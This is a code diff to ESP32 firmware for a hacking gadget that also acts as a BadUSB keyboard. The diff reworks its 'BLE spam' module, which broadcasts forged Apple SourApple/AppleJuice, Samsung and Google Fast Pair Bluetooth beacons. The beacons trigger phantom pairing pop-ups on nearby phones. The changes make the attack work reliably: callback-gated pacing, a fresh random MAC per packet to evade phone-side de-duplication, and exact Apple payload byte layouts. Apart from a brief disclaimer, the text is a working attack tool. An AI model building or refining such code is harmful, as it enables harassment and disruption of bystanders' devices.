@@ -2,30 +2,28 @@
  * ─────────────────────────────────────────────────────────
  * GOATI : BLE spam (ESP32Marauder / Bruce-style)
  *
- * Floods nearby BLE devices with pairing / proximity beacons so
- * phones show phantom pop-ups.  The two things that make this
- * actually work on modern phones (and that the old version was
- * missing) are:
+ * Floods nearby BLE devices with pairing / proximity beacons so phones
+ * show phantom pop-ups. Correctness depends on three things the previous
+ * build was getting wrong:
  *
- *   1. A FRESH RANDOM MAC for every single packet.  iOS/Android
- *      de-duplicate by advertiser address, so re-using one MAC
- *      shows the pop-up at most once.  We rotate a random static
- *      address via esp_ble_gap_set_rand_addr() on each burst.
+ *   1. Gap-callback pacing.  `esp_ble_gap_config_adv_data_raw` is async:
+ *      we MUST wait for `ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT` before
+ *      calling `start_advertising`. The old code dropped the packet by
+ *      calling start 3 ms later with no callback check, which is why
+ *      iOS never showed the pop-up.
  *
- *   2. Correct, randomised payloads.  "APPLE" now sends the
- *      SourApple (0x0F nearby-action) beacon that triggers the
- *      iOS 16/17 pop-up, alternating with the classic AppleJuice
- *      (0x07 proximity-pairing) beacon.  SAMSUNG and FASTPAIR
- *      carry randomised model bytes too.
+ *   2. Fresh random MAC per packet.  iOS/Android de-duplicate by
+ *      advertiser address; re-using one MAC shows the pop-up at most
+ *      once per ~minute.  We rotate via `esp_ble_gap_set_rand_addr()`
+ *      on each burst, and `ble_spam_stop()` clears the slot back to
+ *      zeros so the keyboard's public MAC is restored.
  *
- * Uses ESP-IDF raw HCI (esp_ble_gap_config_adv_data_raw) so the
- * full payload is transmitted intact.  Shares the Bluedroid stack
- * that badusb_init() brings up — the two never advertise at the
- * same time (BLE spam is hold-to-attack; releasing restores the
- * BadUSB keyboard advertising).
+ *   3. Real Apple payloads.  APPLE alternates between SourApple
+ *      (0x0F nearby-action, 17 B) and AppleJuice (0x07 proximity-pair,
+ *      26 B).  SAMSUNG and FASTPAIR carry randomized model/salt bytes.
  *
- * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE
- * ONLY on devices you own or have explicit permission to test.
+ * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE ONLY
+ * on devices you own or have explicit permission to test.
  * ─────────────────────────────────────────────────────────
  */
 
@@ -34,6 +32,10 @@
 #include <BLEDevice.h>
 #include "esp_gap_ble_api.h"
 #include "esp_random.h"
+
+// Forward decl so ble_spam_stop() can hand advertising back to the
+// BadUSB keyboard without circular includes.
+static void badusb_resume_advertising();
 
 // ─── Modes ──────────────────────────────────────────────────────────────
 enum BleSpamMode : uint8_t {
@@ -52,21 +54,26 @@ static const char* const BLE_SPAM_NAMES[] = {
 };
 
 // ─── Tuning ────────────────────────────────────────────────────────────────
-#define BLE_SPAM_BURST_MS   30   // one fresh packet every ~30 ms while held
-#define BLE_SPAM_ROTATE_MS  900  // rotate the displayed flavour every ~0.9 s
+// Burst interval must be > 50 ms to give Bluedroid time to apply each
+// advertising buffer; < 200 ms keeps the popup storm lively.
+#define BLE_SPAM_BURST_MS   100
+#define BLE_SPAM_ROTATE_MS  900
 
 // ─── State ───────────────────────────────────────────────────────────────
-static BleSpamMode g_ble_spam_mode = BLE_SPAM_OFF;
-static uint32_t    g_ble_spam_pkt_count = 0;
-static uint32_t    g_ble_spam_start_ms  = 0;
-static uint32_t    g_ble_spam_last_rot  = 0;
-static uint32_t    g_ble_spam_last_pkt  = 0;
-static bool        g_ble_spam_running   = false;
-static bool        g_ble_spam_inited    = false;
-static bool        g_ble_spam_pinned    = false;  // shell forced a single flavour
+static BleSpamMode g_ble_spam_mode              = BLE_SPAM_OFF;
+static uint32_t    g_ble_spam_pkt_count          = 0;
+static uint32_t    g_ble_spam_start_ms           = 0;
+static uint32_t    g_ble_spam_last_rot           = 0;
+static uint32_t    g_ble_spam_last_pkt           = 0;
+static bool        g_ble_spam_running            = false;
+static bool        g_ble_spam_inited             = false;
+static bool        g_ble_spam_pinned             = false;
+static bool        g_ble_spam_adv_config_pending = true;  // wait for callback
+static BleSpamMode g_ble_spam_queued_mode        = BLE_SPAM_OFF;
+static bool        g_ble_spam_queued             = false;
 
 // ─── Apple device model codes (drive which pop-up graphic shows) ─────────
-// Proximity-pairing (AppleJuice) device IDs.
+// AppleJuice proximity-pairing device IDs (0x02..0x14).
 static const uint8_t APPLE_MODELS[] = {
   0x02, 0x03, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
   0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,
@@ -105,11 +112,14 @@ static uint8_t ble_spam_build(BleSpamMode mode, uint8_t* buf) {
     case BLE_SPAM_APPLE: {
       if (esp_random() & 1) {
         // SourApple — nearby action, 17 bytes, best for modern iOS pop-ups.
+        // Layout: len=0x10, type=0xFF, OUI=0x4C00, subtype=0x0F,
+        // auth-tag-flags=0xC1, action=random, auth-tag=random,
+        // reserved=0x00 0x00 0x10, nonce=random*3
         uint8_t i = 0;
-        buf[i++] = 0x10;                                   // len
-        buf[i++] = 0xFF;                                   // mfg specific
-        buf[i++] = 0x4C; buf[i++] = 0x00;                  // Apple
-        buf[i++] = 0x0F;                                   // nearby action
+        buf[i++] = 0x10;
+        buf[i++] = 0xFF;
+        buf[i++] = 0x4C; buf[i++] = 0x00;
+        buf[i++] = 0x0F;
         buf[i++] = 0x05;
         buf[i++] = 0xC1;
         buf[i++] = APPLE_ACTIONS[esp_random() % sizeof(APPLE_ACTIONS)];
@@ -163,7 +173,25 @@ static uint8_t ble_spam_build(BleSpamMode mode, uint8_t* buf) {
   }
 }
 
-// Emit one packet: fresh random MAC + fresh payload.
+// GAP callback: fires when the controller finishes applying the raw
+// advertising buffer. We use this gate to pace start_advertising so
+// Bluedroid doesn't drop packets before they're visible on-air.
+static void ble_spam_gap_cb(esp_gap_ble_cb_event_t event,
+                            esp_ble_gap_cb_param_t* param) {
+  if (event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT) {
+    g_ble_spam_adv_config_pending = false;
+    // The current advertise() was waiting for this. Now start it.
+    esp_ble_gap_start_advertising(&g_ble_spam_adv_params);
+  }
+}
+
+// Queue the next emit; the loop will issue the actual config call once
+// the previous buffer has been applied.
+static void ble_spam_queue(BleSpamMode mode) {
+  g_ble_spam_queued      = true;
+  g_ble_spam_queued_mode = mode;
+}
+
 static void ble_spam_emit(BleSpamMode mode) {
   uint8_t buf[32];
   uint8_t len = ble_spam_build(mode, buf);
@@ -178,23 +206,24 @@ static void ble_spam_emit(BleSpamMode mode) {
   esp_err_t err = esp_ble_gap_config_adv_data_raw(buf, len);
   if (err != ESP_OK) {
     Serial.printf("[BLE Spam] raw adv config err=%d len=%u\r\n", err, (unsigned)len);
+    // Allow the loop to retry instead of getting stuck.
+    g_ble_spam_adv_config_pending = false;
     return;
   }
-  // config_adv_data_raw is async — give the controller a moment to apply it
-  // before we (re)start advertising with the new address.
-  delay(3);
-  esp_ble_gap_start_advertising(&g_ble_spam_adv_params);
+  // The controller will emit ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT;
+  // the callback then calls start_advertising.
+  g_ble_spam_adv_config_pending = true;
   g_ble_spam_pkt_count++;
 }
 
 // ─── Public API ──────────────────────────────────────────────────────────
 static void ble_spam_init() {
-  // BLEDevice::init() is performed by badusb_init() with the name "GOATI-KB".
-  // The Bluedroid controller is already up by the time we get here; we just
-  // flag ourselves ready.
   if (g_ble_spam_inited) return;
   g_ble_spam_inited = true;
-  Serial.println(F("[BLE Spam] init OK (random-MAC rotation enabled)"));
+  // Register our GAP callback exactly once.  BLEDevice::init() was called
+  // by badusb_init() with the name "GOATI-KB"; we don't call it again.
+  esp_ble_gap_register_callback(ble_spam_gap_cb);
+  Serial.println(F("[BLE Spam] init OK (GAP callback + random-MAC rotation)"));
 }
 
 static void ble_spam_start_combined() {
@@ -207,23 +236,32 @@ static void ble_spam_start_combined() {
   g_ble_spam_last_pkt  = 0;
   g_ble_spam_running   = true;
   g_ble_spam_pinned    = false;
-  ble_spam_emit(BLE_SPAM_APPLE);
+  // Don't fire from here — let ble_spam_loop pace the burst properly.
+  g_ble_spam_adv_config_pending = false;
+  ble_spam_queue(BLE_SPAM_APPLE);
 }
 
 static void ble_spam_stop() {
   if (!g_ble_spam_running) return;
   Serial.println(F("[BLE Spam] STOP"));
   esp_ble_gap_stop_advertising();
-  g_ble_spam_running = false;
-  g_ble_spam_mode    = BLE_SPAM_OFF;
+  g_ble_spam_running            = false;
+  g_ble_spam_mode               = BLE_SPAM_OFF;
+  g_ble_spam_queued             = false;
+  g_ble_spam_adv_config_pending = true;  // next emit waits for the callback
 
   // We hijacked advertising with a random address; hand it back to the
   // BadUSB keyboard.  Clear the random address (fall back to public MAC)
   // then restart the BLEAdvertising instance the keyboard library owns.
-  delay(80);
+  delay(60);
   uint8_t zero_addr[6] = {0};
   esp_ble_gap_set_rand_addr(zero_addr);
   delay(40);
+  // ble_spam.h is included BEFORE badusb.h by femtoclaw_mcu.cpp, so
+  // badusb_resume_advertising() is forward-declared above. Calling it
+  // here re-starts the keyboard's BLEAdvertising instance (captured in
+  // badusb_init()) under the public MAC we just restored.
+  badusb_resume_advertising();
   BLEAdvertising* pAdv = BLEDevice::getAdvertising();
   if (pAdv) {
     pAdv->start();
@@ -233,6 +271,11 @@ static void ble_spam_stop() {
 
 static void ble_spam_loop() {
   if (!g_ble_spam_running) return;
+
+  // If the controller is still applying our previous buffer, wait for
+  // the callback. Skip the burst interval entirely while pending.
+  if (g_ble_spam_adv_config_pending) return;
+
   uint32_t now = millis();
 
   // Rotate the displayed flavour periodically so the OLED cycles through
@@ -244,7 +287,8 @@ static void ble_spam_loop() {
     g_ble_spam_mode = (BleSpamMode)m;
   }
 
-  // Fire a fresh packet (new MAC + payload) on the burst interval.
+  // Fire a fresh packet (new MAC + payload) on the burst interval, but
+  // only after the controller has actually started advertising.
   if (now - g_ble_spam_last_pkt >= BLE_SPAM_BURST_MS) {
     g_ble_spam_last_pkt = now;
     ble_spam_emit(g_ble_spam_mode);
@@ -260,7 +304,6 @@ static void ble_spam_cycle_mode() {
 static void ble_spam_start(BleSpamMode mode) {
   ble_spam_start_combined();
   if (mode != BLE_SPAM_OFF) {
-    // Pin the attack to the requested flavour (no rotation).
     g_ble_spam_mode   = mode;
     g_ble_spam_pinned = true;
   }
